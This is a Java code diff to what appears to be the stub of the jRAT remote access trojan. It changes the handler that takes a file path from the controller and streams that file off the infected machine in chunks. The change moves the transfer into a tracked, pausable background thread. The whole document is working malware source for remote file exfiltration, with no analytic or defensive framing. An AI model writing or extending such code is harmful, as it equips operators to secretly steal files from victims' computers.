@@ -3,6 +3,9 @@ package se.jrat.stub.packets.incoming;
 import java.io.File;
 import java.io.FileInputStream;
 
+import se.jrat.common.TransferRunnable;
+import se.jrat.common.io.FileCache;
+import se.jrat.common.io.TransferData;
 import se.jrat.stub.Connection;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet29ClientUploadPart;
@@ -16,18 +19,29 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 	public void read() throws Exception {
 		final File file = new File(Connection.instance.readLine());
 
-		if (file.exists() && file.isFile()) {
+		if (file.exists() && file.isFile()) {			
 			Connection.instance.addToSendQueue(new Packet30BeginClientUpload(file));
 
-			new Thread(new Runnable() {
+			TransferData data = new TransferData();
+			data.setLocalFile(file);
+			data.setRunnable(new TransferRunnable(data) {
+				@Override
 				public void run() {
-					try {
-
+					try {			
 						FileInputStream fileInput = new FileInputStream(file);
 						byte[] chunk = new byte[1024 * 1024];
 
 						int read;
 						while ((read = fileInput.read(chunk)) != -1) {
+							if (pause) {
+								try {
+									Thread.sleep(Long.MAX_VALUE);
+								} catch (InterruptedException e) {
+
+								} catch (Exception e) {
+									e.printStackTrace();
+								}
+							}
 							AbstractOutgoingPacket packet = new Packet29ClientUploadPart(file, chunk, read);
 							Connection.instance.addToSendQueue(packet);
 						}
@@ -38,7 +52,10 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 						ex.printStackTrace();
 					}
 				}
-			}).run();
+			});
+			data.start();
+			
+			FileCache.put(file, data);
 		}
 	}
 
